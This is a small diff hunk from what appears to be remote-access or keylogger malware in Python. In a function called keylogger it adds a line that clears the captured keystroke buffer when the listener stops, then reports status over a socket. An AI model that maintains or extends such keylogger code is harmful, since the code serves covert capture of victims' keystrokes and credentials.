@@ -314,6 +314,7 @@ def keylogger(option):
         if KeyListener.running:
             KeyListener.stop()
             threading.Thread.__init__(KeyListener)  # re-initialise the thread
+            del strKeyLogs
             objSocket.send(str.encode("success"))
         else:
             objSocket.send(str.encode("error"))
